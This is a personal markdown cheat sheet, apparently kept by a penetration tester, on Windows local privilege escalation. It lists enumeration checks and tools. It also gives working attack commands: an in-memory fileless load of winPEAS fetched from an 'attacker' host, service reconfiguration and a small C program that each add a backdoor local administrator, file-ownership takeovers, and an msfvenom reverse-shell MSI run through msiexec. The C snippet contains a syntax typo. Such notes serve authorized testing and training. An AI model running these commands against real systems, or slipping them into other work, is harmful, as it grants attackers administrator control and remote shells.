---
title: Windows Privilege Escalation
---

Local [[notes/mitre-attack/privilege-escalation]] on [[notes/windows/index]].

Common checks ([source](http://web.archive.org/web/20230804173720/https://scribe.rip/@specterops/challenges-in-post-exploitation-workflows-2b3469810fe9)):

- processes including integrity levels and backing file
- service with unquoted service path
- service with writable backing file
- service with insecure security descriptor
- scheduled task with writable backing file
- named pipes including originating processes and SDDLs
- open TCP/UDP ports and their originating processes
- drivers currently installed, including backing files
- existing handles with overly permissive access rights
- recent temporary files and their SDDL
- various registry settings

Run a ton of checks.

=== "[[notes/tools/winpeas]]"
    ~~~ powershell
    $a=[System.Reflection.Assembly]::Load([byte[]](iwr -useb 'http://attacker.corp.local/winpeas.exe' | Select-Object -ExpandProperty Content))
    [winPEAS.Program]::Main('wait')
    ~~~

=== "[[notes/tools/privesccheck]]"
    ~~~ ps1
    import-module .\PrivescCheck.ps1
    Invoke-PrivescCheck
    ~~~

Test if credentials are valid.

~~~ powershell
$c = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList '.\nobody',(ConvertTo-SecureString -AsPlainText -Force 'passw0rd')
Start-Process -Credential $c -FilePath whoami.exe -ArgumentList '/all' -WindowStyle hidden -Wait -RedirectStandardOutput out.txt -RedirectStandardError err.txt
~~~

Other tools:

- [Seatbelt](https://github.com/GhostPack/Seatbelt)

Untested tools:

- [PipeViewer](https://github.com/cyberark/PipeViewer), shows detailed information about named pipes on Windows
- [Crassus](https://github.com/vullabs/Crassus)
- [SharpUp](https://github.com/ghostpack/sharpup), C# port of various [PowerUp](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1) functions
- [beroot](https://github.com/AlessandroZ/BeRoot)
- [Windows Exploit Suggester Next Generation ](https://github.com/bitsadmin/wesng), checks Windows version for known vulnerabilities, processes output of `systeminfo` on Linux
- [ProtectionChecks.ps1](https://gist.github.com/jsecurity101/6b9e87f5a428f31d41ffc8c1ee05a999), checks whether a process is running as PPL

References:

- [book.hacktricks.xyz/windows/checklist-windows-privilege-escalation](https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation)
- [exploit-notes.hdks.org/exploit/windows/privilege-escalation](https://exploit-notes.hdks.org/exploit/windows/privilege-escalation/)
- [Escalating Privileges via Third-Party Windows Installers](https://web.archive.org/web/20230720190244/https://www.mandiant.com/resources/blog/privileges-third-party-windows-installers)
- [The Print Spooler Bug that Wasn’t in the Print Spooler - Maddie Stone & James Forshaw - OffensiveCon23](https://www.youtube.com/watch?v=H03b0UaogVs), exploiting Windows side-by-side assemblies
- [Awesome Windows logical bugs](https://github.com/sailay1996/awesome_windows_logical_bugs)
- [Payloads all the Things - Windows Privilege Escalation](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)

# Insecure File Permissions

Search with [AccessChk](https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk) for writable files.

~~~ bat
accesschk.exe -accepteula -nobanner -u -w -s $env:USERNAME C:\
~~~

Especially check writable files and directories in the system path.
This can be exploited with e.g. [StorSvc](https://github.com/blackarrowsec/redteam-research/tree/master/LPE%20via%20StorSvc).

~~~ bat
reg.exe query "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment" -v Path
~~~

Check the permissions the current user has on a file.

=== "builtin"
    ~~~ bat
    icacls.exe "C:\Program Files\Example\Service.exe"
    ~~~

    An output like `BUILTIN\Users:(I)(F)` is quiet bad, it means any user can overwrite it.

    Mask | Permissions
    -----|------------
    F    | Full access
    M    | Modify access
    RX   | Read and execute access
    R    | Read-only access
    W    | Write-only access

=== "PowerShell"
    ~~~ powershell
    Get-Acl "C:\Program Files\Example\Service.exe"
    ~~~

Take file ownership and grant yourself full access.

~~~ bat
takeown.exe /F .\example.exe
cacls.exe .\example.exe /E /G %USERNAME%:F
~~~

Untested tools:

- [UserWritableLocations.ps1](https://gist.github.com/hinchley/ade9528e5ce986e9a8131489ad852789)
- [find_writable.ps1](https://github.com/0xC0D1F1ED/find_writable_files/blob/master/find_writable.ps1)

# Services

Get the current service status including the PID.

~~~ bat
sc.exe queryex snmptrap
~~~

Get the current service configuration.

~~~ bat
sc.exe qc snmptrap
~~~

## Insecure Service Security Descriptor

Set the account to `NT Authority\System`.

~~~ bat
sc.exe config snmptrap obj= "NT AUTHORITY\System"
~~~

Then change the executable to a command that adds a local admin.

~~~ bat
sc.exe config snmptrap binPath= "cmd.exe /c net user hacker P@ssw0rd /add && net localgroup administrators hacker /add"
~~~

References:

- [Viewing Service ACLs](https://web.archive.org/web/20230131040322/https://rohnspowershellblog.wordpress.com/2013/03/19/viewing-service-acls/)

## Unquoted Service Path

The service must have a space in the absolute path to its executable and the path must not be enclosed in quotation marks.
Given the path `C:\Program Files\My Program\My Service\service.exe` check if you can write any of the following files:

~~~
C:\Program.exe
C:\Program Files\My.exe
C:\Program Files\My Program\My.exe
C:\Program Files\My Program\My service\service.exe
~~~

If that's the case, place your malicious binary there and wait for the service to restart.

## Writable Service Binary

Replace the service binary with an executable that adds a new local admin.

`./evil.c`:

~~~ c
#include <stdlib.h>

int main() {
  system("net user backdoor passw0rd /add");
  system("net localgroup administrators backdoor /add");
  return 0:
}
~~~

If you have `SeShutdownPrivilege` reboot the system, otherwise wait for the service to restart.

~~~ bat
shutdown.exe /r /t 0
~~~

## Writable Service Registry Keys

User can modify registry keys of a service ([source](http://web.archive.org/web/20231004130556/https://0xdf.gitlab.io/2020/04/25/htb-control.html))

~~~ bat
accesschk.exe %USERNAME% -kwsu HKLM\System\CurrentControlSet\Services
~~~

# Always Install Elevated

If the `AlwaysInstallElevated` registry key is set to `1`, unprivileged users can run MSI installers with admin privileges.

~~~ bat
reg.exe query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg.exe query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
~~~

Generate a reverse shell payload.

~~~ bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.196 LPORT=7101 -f msi -o ./pwn.msi
~~~

Execute the MSI.

~~~ bat
msiexec.exe /quiet /qn /i .\pwn.msi
~~~
